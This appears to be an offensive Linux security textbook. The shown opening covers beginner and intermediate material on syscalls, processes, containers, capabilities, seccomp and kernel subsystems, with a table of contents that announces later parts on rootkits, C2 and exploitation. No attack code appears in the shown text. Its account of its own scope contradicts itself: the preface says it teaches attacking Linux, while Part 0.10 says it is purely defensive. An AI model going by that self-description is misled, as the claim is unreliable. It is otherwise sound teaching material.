# Learning Kernel Security, Exploitation, and eBPF

## Preface

This book is an *operational* learning guide for offensive Linux security: kernel internals, userspace and kernel exploitation, container and Kubernetes attack surface, eBPF, and the engagement workflow that turns those into authorized work.

It teaches you to attack Linux. It also teaches you what attacking Linux looks like from the defender's side — every technique here is paired with its detection footprint, the mitigation that defeats it, and the lab setup needed to practice it safely — because that is how good offensive operators actually think. You cannot evade what you do not understand, and you cannot escalate what you cannot reason about defensively.

The technical focus is Linux. The book covers the kernel, userspace binary exploitation, ROP, heap, race conditions, eBPF rootkits, container escapes, Kubernetes red team paths, cloud and supply chain pivots, command-and-control, vulnerability research, and fuzzing. Cornela and MiLog appear as case studies of how the same primitives look on the defensive side.

**On the offensive content.** PoCs target deliberately-vulnerable lab programs you compile yourself (Parts 28, 48, 49, 51) or named public CTF challenges that exist to be solved (Parts 50, 51). The book does not contain working exploits for real production CVEs, weaponized payloads, or detection-evasion code aimed at named commercial EDRs. That line — between teaching skill and shipping weapons — is where every responsible offensive course sits, including this one.

**On authorization.** Read Part 34 (Rules Of Engagement) before doing anything outside your own lab. The fastest way to ruin a security career is to skip the paperwork.

Several sections align with the learning path in Kaiwan N. Billimoria's *Linux Kernel Programming*: kernel architecture, memory management, loadable kernel modules, scheduling, and synchronization. This book uses those topics from the attacker's perspective — what is reachable, what is exploitable, what is detectable.

The intended reading experience is progressive. The early chapters explain the operating-system model carefully — assuming nothing more than "I have used a Linux command line a few times." The middle chapters connect that model to exploitation and observability. The later chapters assume the reader can already reason about the kernel as a system rather than as a bag of commands.

This book is meant to read like a field manual you can grow with: start at Part 0 if you are new, jump to whichever level matches you if you are already experienced.

## How This Book Is Leveled

Each Part of this book is tagged with a difficulty level. You can read straight through, or you can read in passes — first the Beginner-level Parts, then come back for Intermediate, and so on.

The four levels are:

- **Beginner** — assumes you have used the Linux command line and written some code, but have not studied operating systems formally. The Beginner Parts explain every term as it appears, with no prerequisites beyond curiosity.
- **Intermediate** — assumes the Beginner material is comfortable. You should be able to explain what a process, syscall, file descriptor, and user-vs-root mean in your own words before you start here.
- **Advanced** — assumes the Intermediate material is comfortable. You should be able to read a man page for a syscall and a small piece of C code without confusion. Some Parts at this level discuss memory layouts, allocators, and exploitation primitives at a level that requires effort even from experienced engineers.
- **Expert** — assumes you can already reason about kernel subsystems, primitives, and detection design. These Parts skip the basics and go straight to the tradeoff-level reasoning experienced practitioners use.

You will not become an expert by reading the Expert chapters first. You will become an expert by reading the Beginner and Intermediate chapters carefully, doing the practice in Part 31, and then re-reading the harder Parts a second time.

## Table Of Contents

The level after each title is the recommended starting level for that Part.

0. Before You Start: Foundations For Absolute Beginners — *Beginner*
1. What The Kernel Is — *Beginner*
2. Why Kernel Security Matters — *Beginner*
3. Core Linux Concepts Every DevSecOps Engineer Should Know — *Beginner → Intermediate*
4. Kernel Architecture You Should Understand — *Intermediate*
5. Kernel Memory Model For Defenders — *Intermediate → Advanced*
6. The Defensive Exploitation Mindset — *Intermediate*
7. Low-Level Attack Vectors Into The Kernel — *Intermediate*
8. Important Kernel Bug Classes — *Intermediate → Advanced*
9. Kernel Exploitation As A Defensive Model — *Advanced*
10. Common Kernel Mitigations You Should Know — *Intermediate*
11. Copy Fail As A Learning Case — *Intermediate*
12. The Important Low-Level Concepts Behind Copy Fail — *Advanced*
13. Why Containers Make This Worse — *Intermediate*
14. Understanding eBPF — *Intermediate*
15. Case Study: Cornela — *Intermediate*
16. Case Study: Mapping Kernel Risk To Detection With Cornela — *Intermediate*
17. Case Study: What Cornela Contributes In Practice — *Intermediate*
18. Case Study: Auditing Methodology From MiLog — *Intermediate → Advanced*
19. What Prevention Looks Like — *Beginner → Intermediate*
20. What To Study From Linux Kernel Programming — *Intermediate*
21. A DevSecOps Learning Roadmap — *Beginner*
22. A Safe Way To Learn With Cornela As A Case Study — *Beginner → Intermediate*
23. A Safe Way To Learn With MiLog As A Case Study — *Beginner → Intermediate*
24. What These Case-Study Tools Do Not Replace — *Intermediate*
25. The Main Lessons To Remember — *Beginner*
26. Implementation Examples — *Advanced*
27. Advanced Technical Chapters — *Expert*
28. Userspace Binary Exploitation Foundations — *Intermediate → Advanced*
29. Concrete Kernel Exploitation Techniques (Defensively) — *Advanced → Expert*
30. Deep eBPF — *Advanced*
31. Tooling, Labs, And Practice — *Beginner → Advanced*
32. Reading List And Reference Material — *All levels*
33. Engagement Lifecycle On Linux (Red Team Track) — *Intermediate*
34. Rules Of Engagement, Authorization, And OPSEC — *Beginner → Intermediate*
35. Linux Post-Exploitation Playbook — *Intermediate → Advanced*
36. Persistence Taxonomy On Linux — *Intermediate*
37. Linux Malware And Rootkit Families — *Advanced*
38. Container Exploitation And Escape — *Intermediate → Advanced*
39. Kubernetes Red Team — *Intermediate → Advanced*
40. Cloud And CI/CD Supply Chain Red Team — *Intermediate*
41. Reverse Shells, Tunneling, And C2 On Linux — *Intermediate*
42. Vulnerability Research Workflow — *Advanced*
43. Fuzzing For Red Team — *Advanced*
44. MITRE ATT&CK On Linux — *All levels (reference)*
45. Red-Team Tool Catalog — *All levels (reference)*
46. Hardware And Firmware Threat Surface — *Advanced*
47. Anti-Detection And EDR Evasion (Concepts) — *Advanced*
48. ROP And Code-Reuse Attacks (Deep Dive) — *Advanced* (read after Part 28)
49. Cross-Class PoC Workbook — *Advanced* (lab exercises)
50. Curated CTF Curriculum — *All levels*
51. Worked Challenge Solutions — *Advanced* (full exploit walkthroughs)
52. Complete Lab Setup Guide — *All levels* (do this first)

**Back Matter** (unnumbered)

- Glossary — *All levels (reference)*
- How To Build This Book As EPUB Or PDF
- External References

## Who This Is For

This guide is useful if you are:

- learning offensive Linux security and want a single source that goes from beginner foundations through kernel exploitation, container escapes, and engagement workflow
- a beginner who can use a Linux terminal and wants to understand what is happening underneath the commands
- a security learner who has read CVE summaries but does not yet feel fluent in the language of kernel internals or exploitation
- a pentester, red teamer, or security consultant taking on Linux, container, or cloud engagements
- a DevSecOps engineer or platform/SRE who wants to reason about kernel risk and runtime detection from the attacker's side
- an experienced engineer who wants a single reference that connects kernel internals, exploitation thinking, eBPF observability, and red-team operations

If you are completely new, do not skip Part 0. It is short, and it will make every later chapter easier to follow.

## How To Read This

You can read this book in three honest ways:

**1. Linear, slow read (recommended for beginners).** Start at Part 0 and read in order. Skip any *Advanced* or *Expert* Parts on your first pass — they are marked, and they will make more sense on a second pass.

**2. Topic-driven read (recommended for intermediate readers).** Pick a topic you want to understand (binary exploitation, container escape, eBPF, C2 — your call), find the matching Part in the Table of Contents, and follow the cross-references back into the foundations as needed.

**3. Reference read (for experienced practitioners).** Treat the *Beginner* and *Intermediate* Parts as a vocabulary check, then jump straight to the *Advanced* and *Expert* Parts. Use the Glossary at the end and the per-technique cross-reference in Part 44 (MITRE ATT&CK) as your index.

The conceptual layers are the same regardless of which path you choose:

1. The high-level model of what the kernel is and why it matters.
2. The Linux mechanisms that create or reduce attack surface.
3. The shape of low-level exploitation: bug → primitive → impact.
4. How those primitives play out in userspace, the kernel, containers, Kubernetes, and cloud.
5. How eBPF gives runtime visibility into those mechanisms — useful both as an attacker (rootkits, evasion) and as a defender.
6. How an authorized engagement actually runs, end to end.

### Structural Map Of The Book

- **Part 0** — beginner foundation
- **Parts 1–5** — Linux and kernel fundamentals
- **Parts 6–10** — exploitation thinking and hardening
- **Parts 11–14** — concrete vulnerability class (Copy Fail) and eBPF
- **Parts 15–18** — case studies (Cornela, MiLog)
- **Parts 19–27** — practice, implementation, advanced reasoning
- **Parts 28–32** — userspace exploitation, kernel exploitation techniques, deep eBPF, tooling/labs, reading list
- **Parts 33–47** — engagement lifecycle, post-ex, persistence, rootkits, container escape, K8s, cloud, C2, vulnerability research, fuzzing, ATT&CK, tools, hardware, evasion
- **Parts 48–52** — ROP deep dive, cross-class PoCs, CTF curriculum, worked solutions, complete lab setup
- **Back matter** — Glossary, EPUB build guide, External References

## Notation Used In This Book

A few conventions you will see again and again:

- **"In simple terms:"** introduces a beginner-friendly restatement of an idea that was just explained more formally.
- **"Why this matters:"** introduces the security or operational stakes of an idea, so you do not have to guess why something is being explained.
- **Code blocks marked `text`** are diagrams or pseudo-shell, not real commands you should run.
- **Code blocks marked `c`, `bash`, `rust`, `go`, `python`** are real code in that language. Most are illustrative, not complete programs.
- **Italicized book titles** like *Linux Kernel Programming* refer to companion texts listed in the Reading List (Part 32).
- A `term in backticks` is either a literal name (a syscall, a file path, a function) or a term you can search for verbatim.
- When a sentence really matters, it is set off in its own block:

```text
sentences in their own block are the ones to remember
```

## Part 0: Before You Start — Foundations For Absolute Beginners

**Level: Beginner.** No prior systems knowledge assumed. If you already know what a process, syscall, file descriptor, and user account are, you can skim this Part for vocabulary check and move on.

This Part gives you the smallest possible mental model of how a computer runs programs. Every later Part of the book builds on these ideas. If a sentence here surprises you, slow down — the rest of the book will quietly assume it.

### 0.1 What An Operating System Is

When you press the power button on a computer, the hardware (CPU, memory, disks, network cards) is just dumb electronics. It does not know what a "browser" or "file" is. Something has to translate "open Google Chrome" into "tell the disk to read these blocks, copy them into memory, set up the CPU to run them, draw pixels on the screen."

That something is the **operating system**.

An operating system has roughly three jobs:

1. **Manage hardware** — it talks to disks, networks, displays, keyboards, etc., so applications do not have to.
2. **Run programs** — it loads programs from disk, gives them memory and CPU time, and stops them when they finish.
3. **Enforce rules** — it decides which programs can do what (read this file? open this network port? talk to this device?).

Linux is one of the most widely used operating systems in the world. Almost every server, almost every container, most embedded devices, and every Android phone runs a Linux kernel underneath.

### 0.2 Kernel vs Userspace: The Two Worlds

Inside a Linux system, code lives in one of two worlds:

- **The kernel** is the central, privileged piece of the operating system. It can do anything: read any memory, talk to any device, change any setting.
- **Userspace** is where normal programs run. Userspace programs are not trusted with hardware — they have to ask the kernel for everything that involves hardware or privileged data.

In simple terms, think of the kernel as the manager and userspace as the employees. Employees do not walk into the company's bank vault themselves; they fill out a request, and the manager decides whether to approve it.

This separation is the whole reason a buggy program does not normally take down the entire computer. The kernel sits between the program and the hardware, and refuses bad requests.

```text
your application (userspace)
  │
  │  asks the kernel to do something
  ▼
the kernel  ────────►  hardware (disk, NIC, screen, ...)
```

Why this matters for security: if a bug lets a userspace attacker make the kernel do something it should not, the attacker has effectively become the manager. Almost every "kernel exploit" you read about is a story of a userspace attacker tricking the kernel into giving them more privilege than they should have.

### 0.3 Programs, Processes, And Threads

A **program** is a file on disk — for example, `/usr/bin/python3`. It is data, not action.

A **process** is a running instance of a program. When you run `python3`, the kernel loads that file into memory and creates a process. If you run `python3` twice in two terminals, you get two processes that happen to share the same program file.

A **thread** is a unit of execution inside a process. A simple program has one thread (one thing happening at a time). A complex program (like a web browser) has many threads, all sharing the same process's memory but executing in parallel.

Each process has:

- a **PID** (Process ID) — a number that identifies it (`12345`)
- a **memory space** — its own private view of memory
- a **user** — whose identity it runs as
- **open files** — files it has open, identified by **file descriptors** (small integers like `0`, `1`, `2`, ...)
- **a parent process** — the process that started it

You can see processes on a Linux system with `ps aux` or `top`. Each row is one process.

### 0.4 Users, Root, And Why Identity Matters

Linux is a multi-user system. Every process runs **as some user**.

Three classes of user identity matter:

- **Regular users** (`alice`, `bob`, your own account) — can read their own files, run programs, but cannot change system-wide settings or read other users' data.
- **`root`** (also called the superuser, UID 0) — can do anything on the system. This power is also what makes root accounts the prize that attackers want.
- **System users** (`www-data`, `postgres`, `nobody`) — special accounts created so that services do not have to run as root.

When a process tries to do something privileged (read `/etc/shadow`, open a low-numbered network port, mount a filesystem), the kernel checks who the process is running as. If the user does not have permission, the kernel refuses.

In simple terms, "the kernel sees you as user X, so it lets you do X-things and not Y-things." This is why "privilege escalation" — going from a regular user to root, or from one user to another — is such a central concept in security.

### 0.5 Files, File Descriptors, And Permissions

A **file** in Linux is broader than what you might think. Regular files (like `report.pdf`) are obvious, but Linux also represents many other things as files:

- a directory is a file (a list of other files)
- a network connection is accessed through a file-like handle
- a piece of hardware is often a file under `/dev/` (`/dev/sda`, `/dev/null`)
- live system information is exposed as files under `/proc/` and `/sys/`

When a process opens any of these, the kernel gives it back a small integer called a **file descriptor**. The process then uses that number to read, write, or close.

Every file has **permissions** — three sets of rules (for the file's owner, the file's group, and everyone else) saying who can read, write, and execute the file. You see them in `ls -l`:

```text
-rw-r--r--   1 alice alice  1024 Jan  1 12:00 notes.txt
```

That `-rw-r--r--` means: owner can read and write, group can read, others can read. Permissions are the kernel's most basic answer to "who is allowed to do what?"

### 0.6 Syscalls: How Programs Talk To The Kernel

When a program wants to do anything that needs the kernel's help — read a file, open a network connection, ask the time, allocate more memory, start a new process — it makes a **syscall**.

A syscall is a controlled doorway from userspace into the kernel. The CPU has a special instruction that says "switch into kernel mode and run the kernel's syscall handler." The kernel:

1. checks who is calling and what they want
2. decides whether to allow it
3. does the work
4. returns a result and switches back to userspace

Examples of common syscalls (you will see these names many times in this book):

- `open` / `openat` — open a file
- `read`, `write` — move data through a file descriptor
- `close` — close a file descriptor
- `fork`, `execve` — start a new process
- `mmap` — map memory
- `socket`, `connect`, `bind`, `accept` — networking
- `setuid` — change which user a process runs as

In simple terms, a syscall is an API call into the operating system. Most programming languages eventually become a sequence of syscalls underneath.

You can watch the syscalls a program makes with `strace`:

```text
strace ls
```

This is one of the most useful "see how the system actually works" tools, and it is worth running on a few common commands just to see what they do.

### 0.7 Memory In Plain Terms

Computers have **memory** (RAM) that holds data while programs run. Each running process gets its own **virtual memory** — its own private map of addresses that look like raw memory, but which the kernel and CPU translate underneath into pieces of real RAM.

Three ideas matter at the beginner level:

- **Each process has its own memory.** Process A normally cannot read process B's memory. The kernel enforces this.
- **Some memory is read-only, some writable, some executable.** Code lives in pages marked "executable but not writable." Data lives in pages marked "writable but not executable." This split prevents a lot of attacks.
- **The kernel has its own memory** that no userspace program can read directly. Bugs that let userspace see kernel memory are usually severe.

When this book says "kernel memory," it means the slice of memory the kernel uses for its own data structures. When it says "userspace memory," it means the slice belonging to a particular process.

### 0.8 What "Containers" Actually Are

You will see the word **container** all through this book. A container is not a tiny virtual machine. It is a normal Linux process (or group of processes) that the kernel has been told to give a restricted view of the system.

The restriction is built from features the kernel already has:

- **Namespaces** — give the process a private view of certain resources (process list, network, mounted filesystems, users)
- **Cgroups** — limit how much CPU, memory, and I/O the process can use
- **Capabilities** — limit which privileged operations the process can do
- **Seccomp** — limit which syscalls the process can call at all
- **Mount rules** — control what filesystem the process sees as its root

Crucially, **all containers on a host share the same kernel**. There is one Linux kernel, and many containers are just processes asking it to give them restricted views.

```text
container A   container B   container C
       \\           |          //
        \\         |         //
         the same Linux kernel
                  |
              real hardware
```

This is why kernel bugs are so important even for "isolated" container workloads: every container on a host depends on the same kernel doing its job correctly.

### 0.9 What Security Means In This Context

When this book talks about "security," it usually means one of:

- **Confidentiality** — making sure secrets (passwords, keys, private data) are not read by who they shouldn't be.
- **Integrity** — making sure data and code are not changed by who they shouldn't be.
- **Availability** — making sure the system keeps working and is not taken down or held for ransom.
- **Isolation** — making sure one user, process, or container cannot reach another's data or capabilities.

At the kernel level, all four of these depend on the kernel doing its job correctly. If the kernel mis-handles one syscall, all four can break at once.

### 0.10 Defensive Versus Offensive Mindsets

Two phrases appear constantly in security work:

- **Offensive security** (red team, exploit development, pentesting) — the work of finding and using bugs.
- **Defensive security** (blue team, detection engineering, hardening, incident response) — the work of preventing, detecting, and recovering from those bugs being used.

This book is written from the defensive side. It teaches you enough about how attacks work that you can defend against them, but it does not give you turnkey exploits.

In simple terms, this book teaches you to read attack writeups fluently, not to write your own attacks. That is the right skill mix for almost every DevSecOps role.

### 0.11 The Smallest Vocabulary You Need Before Part 1

If you are a complete beginner, make sure you can answer these in your own words before moving on:

- What is the difference between a program and a process?
- What is the difference between userspace and the kernel?
- What is a syscall, and why does it exist?
- What does it mean for a file to have permissions?
- Why are containers not the same as virtual machines?
- What does "running as root" actually mean?

If any of those still feel fuzzy, re-read the relevant section in this Part. Everything from here on assumes these answers are clear.

### 0.12 A Beginner-Friendly Lab To Set Up Now

You will get far more out of the rest of this book if you have a Linux system you are willing to break. Three options, in increasing power:

1. **A virtual machine on your laptop** — install [VirtualBox](https://www.virtualbox.org/), [UTM](https://mac.getutm.app/) on macOS, or use `multipass` / `lima`. Install a recent Ubuntu or Debian inside.
2. **A small cloud VM** — almost any cloud provider has a free or cheap tier. SSH in.
3. **WSL2 on Windows** — a real Linux kernel running under Windows. Good enough for most early chapters; not ideal for Parts that touch the kernel deeply.

Once you have a Linux you are willing to break, run these and read the output. You do not have to understand all of it yet. The point is to put your hands on the system the rest of the book describes:

```bash
uname -a              # what kernel are you running?
whoami                # which user are you?
id                    # what groups and IDs?
ps aux | head         # what processes are running?
ls -l /proc/1/        # what does the kernel expose for PID 1?
cat /proc/cpuinfo     # what does the CPU look like?
strace -c ls /        # which syscalls does `ls` make?
```

You can refer back to this lab from any later Part. Many concepts only land properly after you have seen them on a real machine.

## Part 1: What The Kernel Is

**Level: Beginner.** Builds directly on Part 0. If you skipped Part 0 and any of this feels too dense, that is the signal to go back.

The first chapters build the minimum model you need before low-level security discussion starts to make sense. The goal is to understand what the kernel is, how Linux exposes resources, and why trust in the kernel matters so much.

At a high level, the Linux kernel is the part of the operating system that controls:

- processes: which programs are running, when they run, and how they are isolated
- memory: which parts of RAM each process may use and with what permissions
- filesystems: how files are opened, read, written, mounted, and permission-checked
- networking: sockets, packets, ports, routes, and protocol handling
- hardware access: the low-level path to disks, NICs, CPUs, and other devices
- privilege boundaries: who is allowed to do what and under which identity

Applications do not talk directly to hardware. They ask the kernel to do work through syscalls such as:

- `open`
- `read`
- `write`
- `socket`
- `mount`
- `setuid`

The simplest model is:

```text
userspace program
  -> syscall
  -> Linux kernel
  -> hardware or protected system resource
```

If the kernel makes a mistake, that mistake can affect the whole machine because the kernel sits underneath all normal processes.

### Linux Interfaces And The File Abstraction

One important design idea in Linux is that many different resources are exposed through a common file-oriented interface.

Before talking about security, it helps to understand this interface model:

- many different kinds of resources are exposed through the same file-oriented interface
- programs often interact with those resources using familiar operations such as `open`, `read`, `write`, `close`, and `ioctl`
- the kernel tries to make very different things look uniform to userspace

Examples:

- a regular text file is a file
- a disk device such as `/dev/sda` is exposed as a device file
- a terminal is exposed through a device file such as `/dev/tty`
- kernel information is exposed through virtual filesystems such as `/proc` and `/sys`
- pipes and sockets are not normal on-disk files, but they are still accessed through file descriptors and file-like operations

The important idea is uniform access, not that every resource is a normal file stored on disk.

This is why people often say that "everything in Linux is a file." The phrase is shorthand for the broader idea that Linux tries to present many resources through a common interface.

Why this matters for security:

- if a sensitive resource is exposed through a file-like interface, file permissions and file access paths matter
- virtual files such as `/proc` and `/sys` can expose powerful kernel state and control surfaces
- device files can provide direct access to privileged subsystems
- many attacks and defenses in Linux revolve around who can open, read, write, or control these interfaces

This is also why the VFS, the Virtual Filesystem Switch, matters. VFS is the common kernel layer that lets many different backends look like a consistent file interface to userspace.

## Part 2: Why Kernel Security Matters

**Level: Beginner.** Continues directly from Part 1. No new prerequisites.

Once the kernel itself is clear, the next question is why kernel security deserves special attention compared with ordinary application security. This chapter answers that by focusing on privilege, shared state, and enforcement boundaries.

Kernel security matters because the kernel is the trust anchor for almost everything above it.

If a normal application crashes, the impact may stay inside that process. If the kernel is compromised, the attacker may be able to affect:

- process isolation
- memory protections
- filesystem permissions
- networking controls
- credential state
- security policy enforcement

This is why kernel bugs are different from many ordinary application bugs. They can break the assumptions that every application, service, and security control depends on.

From a defensive point of view, kernel security matters for three broad reasons:

### 1. Privilege Concentration

The kernel runs with far more privilege than normal userspace code. If an attacker reaches unintended kernel behavior, the impact may be system-wide.

### 2. Shared State

The kernel owns shared state that many workloads depend on:

- scheduler state: the kernel's record of which task should run on which CPU and when
- page cache: RAM used by the kernel to keep recently used file contents in memory
- mount state: the kernel's record of which filesystems are mounted and where they appear in the directory tree
- credentials: security identity data such as user IDs, group IDs, and capability bits
- namespace relationships: which process belongs to which PID, mount, network, or user namespace
- network stack state: sockets, connections, routes, packet buffers, and protocol state managed by the kernel

That shared state is one reason a small low-level bug can become a large operational problem.

You can think about this as:

```text
many workloads
  -> depend on one shared kernel view of memory, mounts, credentials, and networking
  -> a low-level corruption in that shared state can affect more than one workload
```

### 3. Boundary Enforcement

The kernel enforces many of the boundaries security engineers care about:

- user vs root
- one process vs another
- one container vs the host
- one mount view vs another
- one network namespace vs another

If the kernel gets the boundary wrong, higher-level controls may not save you.

## Part 3: Core Linux Concepts Every DevSecOps Engineer Should Know

**Level: Beginner → Intermediate.** Some sections introduce new vocabulary (LSMs, namespaces, capabilities). If a section feels too dense, read it once for shape, finish the Part, and come back. The terms repeat throughout the book.

**Beginner sidebar.** Treat this Part like a tour through a vocabulary list. You do not need to memorize the details on the first pass — you need to recognize the words when you see them again later.

With the security motivation established, the book now moves into the Linux building blocks that appear repeatedly in both exploitation and defense.

### 1. Processes and Syscalls

A process is a running program. A syscall is the controlled entry from userspace into the kernel.

Security teams care about syscalls because they are where untrusted code touches privileged kernel logic.

### 2. Kernel Space vs Userspace

Userspace is where normal applications run. Kernel space is where the operating system core runs.

Important difference:

- userspace code is restricted
- kernel code is trusted and highly privileged

If an attacker can influence kernel behavior incorrectly, the security impact is much larger than a normal application bug.

### 3. Memory and The Page Cache

The kernel keeps file data in memory to improve performance. This cache is called the page cache.

Why this matters:

- multiple processes may observe the same cached file pages
- containers on the same host can still depend on shared kernel cache state
- a bug that wrongly modifies cached file-backed memory can cross boundaries that look separate at the container level

This is why page-cache corruption bugs are dangerous. They are not just "file bugs." They can become trust-boundary bugs.

### 4. Containers And Shared Kernels

Many engineers first learn isolation through virtual machines. A VM has its own guest kernel. A normal container does not.

Most containers are isolated Linux processes built from host-kernel features such as:

- namespaces: control what the process can see
- cgroups: control and group its resource usage
- capabilities: split root privileges into smaller pieces
- seccomp: restrict which syscalls the process may invoke
- mount rules: control how filesystems appear inside the container

That means the host and the containers share one kernel.

```text
container A \
container B  -> same Linux kernel -> host resources
host process /
```

This is one of the most important ideas in modern platform security:

```text
container isolation is strong process isolation, not a separate kernel
```

So if an untrusted workload can reach a dangerous kernel path, a kernel bug may become:

- local privilege escalation
- container escape risk
- cross-workload impact on the same node

### 5. Namespaces

Namespaces change what a process can see.

Important namespace types:

- PID namespace: controls which processes are visible
- mount namespace: controls which mounted filesystems and paths are visible
- network namespace: controls which network interfaces, routes, and sockets are visible
- user namespace: controls how user and group IDs are mapped and interpreted

If a container shares host namespaces, isolation is weaker. That increases the blast radius of any kernel issue.

### 6. Cgroups

Cgroups control and group processes for resource management and accounting.

Cgroups are how Linux says "these processes belong together and share these limits." They are commonly used for CPU limits, memory limits, I/O accounting, and grouping the processes that belong to one container.

Cgroup information is important because `/proc` and cgroup data reflect what the Linux host actually sees, even if runtime metadata is incomplete.

### 7. Capabilities

Linux capabilities split root power into smaller pieces.

Examples:

- `CAP_SYS_ADMIN`: a very broad administrative capability, often treated as close to root-equivalent
- `CAP_SYS_MODULE`: allows kernel module load and unload operations
- `CAP_SYS_PTRACE`: allows inspection or manipulation of other processes
- `CAP_NET_ADMIN`: allows administrative network operations

In practice, some capabilities are close to root-equivalent for container security. An attacker who compromises a process with broad capabilities has more ways to push deeper into the kernel boundary.

### 8. Seccomp

Seccomp lets you filter which syscalls a process may use.

For DevSecOps, seccomp is one of the most practical kernel attack-surface reduction tools because it can block syscall access before dangerous behavior reaches deeper kernel logic.

In simple terms, seccomp is a syscall filter. It lets a program or container define which syscalls are allowed and which are blocked.

### 9. LSMs: AppArmor and SELinux

Linux Security Modules provide policy enforcement on top of normal Unix permissions.

They do not replace patching, but they can reduce damage by restricting process behavior, file access, and transitions.

In simple terms:

- AppArmor applies profile-based restrictions to programs, often expressed in terms of paths and allowed actions
- SELinux applies label-based restrictions to subjects such as processes and objects such as files

## Part 4: Kernel Architecture You Should Understand

**Level: Intermediate.** This is the first Part where the conceptual depth jumps. You will meet subsystem names you have not seen before.

**Beginner sidebar.** If you are reading this on a first pass and feel lost, do not try to memorize each subsystem name. The single takeaway from this Part is "the kernel is not one big blob — it is many cooperating subsystems, and security bugs usually live at the seams between them." Everything else here is shape, not substance, on a first read.

After learning the visible Linux building blocks, it helps to look one layer deeper and understand how the kernel itself is organized internally.

The Linux kernel is not one flat block of code. For defensive learning, break it into these areas:

- syscall entry and architecture-specific code
- process and scheduler logic
- virtual memory management
- VFS and filesystem code
- networking stack
- device-driver and module code
- security hooks and policy layers
- synchronization and locking paths

This matters because vulnerabilities usually appear in one subsystem but become security problems when they cross subsystem boundaries.

If those names are new, read them like this:

- the scheduler decides which task runs next
- virtual memory decides what addresses mean and what memory can be accessed
- VFS is the common file layer in front of real filesystems such as ext4 or xfs
- drivers are the code that speaks to hardware or privileged device interfaces
- locking and synchronization stop concurrent kernel code from corrupting shared state

Example:

```text
userspace syscall
  -> VFS or socket layer
  -> memory-management path
  -> filesystem-backed page cache
  -> privilege impact
```

That cross-subsystem thinking is important for both debugging and threat modeling.

### User To Kernel Entry

When a userspace process performs a syscall, the CPU transitions from a less-privileged mode to a privileged mode. The kernel validates arguments, copies data from userspace when needed, and dispatches to the relevant subsystem.

From a security view, the important questions are:

- did the kernel validate the pointer and length correctly?
- did it check object lifetime correctly?
- did it synchronize access correctly?
- did it write only to memory it owned?

These are the same questions defenders should ask across many bug classes.

### Process Context And Interrupt Context

One useful distinction emphasized in *Linux Kernel Programming* is process context versus interrupt context.

- process context can often sleep and reschedule
- interrupt context is much more constrained
- code running in different contexts follows different locking and allocation rules

This matters for security because many kernel bugs are really context mistakes:

- sleeping in the wrong context
- taking the wrong lock for the current context
- accessing shared data without the right exclusion
- allocating memory with inappropriate flags for that context

### Loadable Kernel Modules

The Linux kernel supports loadable kernel modules, often called LKMs. Modules extend kernel functionality without rebuilding the whole kernel.

This is powerful for operations and drivers, but from a security perspective it means:

- module loading is privileged and highly sensitive
- vulnerable third-party modules can enlarge attack surface
- module load attempts are high-signal runtime events

From a detection perspective, module-related syscalls represent direct kernel-control activity and are usually high signal.

### Scheduling And Concurrency

The kernel is highly concurrent. Multiple CPUs and threads may touch related state at the same time.

This is one reason kernel bugs are difficult:

- races are real
- object lifetime is subtle
- lock ordering matters
- reference counting mistakes become security bugs

This area is emphasized in *Linux Kernel Programming* because understanding synchronization is necessary to understand why many kernel vulnerabilities happen at all.

The same book also shows why scheduling is not just a performance topic. Scheduling affects:

- when a race window opens
- whether a task is preempted in a critical moment
- how lock contention behaves
- how interrupt and process paths interleave

### Interrupts, Softirqs, Tasklets, And Workqueues

The kernel handles asynchronous events through a tiered deferral system. Each tier has different rules about what code is allowed to do.

- hardware interrupts (top half): a device or timer fires and the CPU jumps into a short handler. Cannot sleep, must run fast, runs with some interrupts often disabled.
- softirqs: deferred work scheduled from interrupt context, used for high-volume paths such as networking, block I/O, and timers. Still cannot sleep.
- tasklets: a thinner layer over softirqs for simpler deferrable work. Still atomic context.
- workqueues: deferrable work that runs in process context on kernel threads. Can sleep, take mutexes, and allocate with broader flags.

Why this matters for security:

- a bug in interrupt context cannot use the same recovery paths as a bug in process context
- a race between an interrupt handler and a syscall path is a real bug class
- many older kernel CVEs come from confusion about which context a piece of code actually runs in

When you read kernel source, the function comment or call site usually tells you the context. If you cannot tell, treat the code as constrained until proven otherwise.

### RCU And Per-CPU Data

Two synchronization patterns appear constantly in modern Linux: RCU and per-CPU variables.

RCU stands for Read-Copy-Update. It is a synchronization technique optimized for read-heavy structures.

In simple terms:

- readers do not take traditional locks
- writers publish a new copy and defer destruction of the old copy
- a grace period waits until no reader can possibly still be using the old version

This is why you see calls such as `rcu_read_lock`, `rcu_read_unlock`, `synchronize_rcu`, `call_rcu`, and `kfree_rcu` throughout networking, VFS, and core data structures.

Security relevance:

- RCU bugs are subtle. Freeing an object before the grace period elapses creates a use-after-free that may only fire under load.
- "This code does not take a lock" does not mean "this code is unsynchronized." It may be RCU.

Per-CPU variables hold one copy of a value per CPU. The kernel uses them for counters, allocator caches, and hot-path state to avoid cross-CPU cache contention.

Security relevance:

- per-CPU state can drift across CPUs in subtle ways
- preemption disable and migration disable matter for correctness
- bugs in per-CPU accounting can corrupt allocators or accounting metadata

### Block I/O Layer

Below filesystems lives the block layer. It maps filesystem requests to actual device I/O.

Important pieces include:

- block devices: disks, partitions, loop devices, device-mapper targets
- request queues: pending I/O ordered for the device
- I/O schedulers: decide ordering and merging of requests
- bio structures: the kernel's representation of a single I/O operation

For defenders, the block layer matters because:

- loop devices can mount arbitrary file content as a filesystem, which broadens attack surface
- device-mapper enables thin provisioning, encryption (dm-crypt), and integrity (dm-verity, dm-integrity)
- bugs in block parsers, filesystems, or partition tables can be reached by mounting a crafted image
- encrypted volume bugs can become trust-boundary bugs

### Network Stack Layers

The Linux networking stack is layered top to bottom:

```text
socket API (userspace facing)
  -> socket family handlers (AF_INET, AF_INET6, AF_UNIX, AF_PACKET, AF_ALG, AF_NETLINK, ...)
  -> protocol handlers (TCP, UDP, ICMP, SCTP, ...)
  -> IP routing and netfilter hooks
  -> qdisc and traffic control
  -> network device drivers
  -> hardware
```

Security-relevant subsystems within networking:

- netfilter and nftables: packet filtering, NAT, connection tracking. Historically a frequent source of CVEs because rule processing is complex and stateful.
- netlink: a socket family used for kernel-userspace control messages. Reachable from many privileged configuration tools and historically rich in bugs.
- packet sockets (`AF_PACKET`): raw packet access, often gated by `CAP_NET_RAW`.
- TCP fast paths: highly optimized and performance-critical, with a long history of memory-safety bugs.
- BPF networking hooks (tc, XDP, cgroup_skb): packet processing controlled by eBPF, covered later.

Defensively, networking attack surface is one of the largest in the kernel and one of the most reachable from remote sources.

### Filesystems In Detail

The VFS layer presents a unified interface, but every concrete filesystem implements its own parsers, allocators, and metadata logic. Each filesystem is therefore an attack surface of its own.

Filesystems you should know exist:

